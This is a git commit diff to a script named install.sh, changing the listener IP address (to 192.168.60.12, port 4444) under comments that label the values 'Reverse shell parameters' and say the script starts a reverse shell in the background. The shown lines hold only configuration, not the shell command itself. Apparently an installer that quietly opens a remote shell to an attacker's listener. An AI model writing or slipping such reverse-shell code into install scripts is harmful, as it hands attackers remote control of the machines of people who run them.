d6cd0624ff00da0e1a12a7e2f58379a842ea9589
swatiai11414 <168453519+swatiai11414@users.noreply.github.com>
2025-01-12 05:03:11 -0800

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Reverse shell parameters
-REMOTE_HOST="192.168.60.191"  # Replace with your listener's IP address
+REMOTE_HOST="192.168.60.12"  # Replace with your listener's IP address
 REMOTE_PORT=4444             # Replace with your listener's port
 
 # Start the reverse shell in the background
